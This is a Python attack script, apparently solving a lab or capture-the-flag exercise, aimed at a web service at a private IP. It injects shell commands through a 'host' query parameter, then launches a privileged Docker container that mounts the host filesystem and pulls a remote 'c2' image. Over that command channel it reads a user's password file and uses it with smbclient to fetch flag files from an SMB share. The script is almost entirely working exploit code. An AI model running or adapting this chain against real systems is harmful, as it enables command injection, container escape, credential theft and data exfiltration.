#!/usr/bin/env python

import random
import socket
import time
import requests

def web_exploit(ip, port, payload):
    if payload:
        out = requests.get(f"http://{ip}:{port}/check?host={payload}")
        print(out.text)
    else:
        out = requests.get(f"http://{ip}:{port}/check")
        print(out.text)
    time.sleep(random.randint(1,3))

def send(socket, cmd):
    print(cmd)
    socket.sendall(cmd.encode())
    output = s.recv(8096)
    print(output.decode())

ip = "192.168.136.4"
web_port = "5000"
c2_port = "3000"

web_exploit(ip, web_port, "")
web_exploit(ip, web_port, "google.com")
web_exploit(ip, web_port, ">/dev/null; whoami")
web_exploit(ip, web_port, ">/dev/null; ls")
web_exploit(ip, web_port, ">/dev/null; groups")
web_exploit(ip, web_port, ">/dev/null; docker run --privileged -d -p 3000:3000 -v /:/host/ k3ngg/c2")

print("WEB DONE")
input()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip, int(c2_port)))
    send(s, "printf 'b1k1N_s04l_p3nt3ST_AD_t4p1_sk1ssu3_'")
    send(s, "chroot /host/ ls /home")
    send(s, "chroot /host/ ls /home/johndoe@frost.local")
    send(s, "chroot /host/ cat /home/johndoe@frost.local/mypass.txt")
    send(s, "chroot /host/ smbclient -L //frost.local/ -U johndoe%$(cat /host/home/johndoe@frost.local/mypass.txt | tail -c 7)")
    send(s, "chroot /host/ smbclient -U johndoe //frost.local/secret $(cat /host/home/johndoe@frost.local/mypass.txt | tail -c 7) -c 'ls'")
    for i in range(1, 32):
        send(s, f"chroot /host/ smbclient -E -U johndoe //frost.local/secret $(cat /host/home/johndoe@frost.local/mypass.txt | tail -c 7) -c 'get flag-{i}.txt /dev/null' 2>/dev/null")
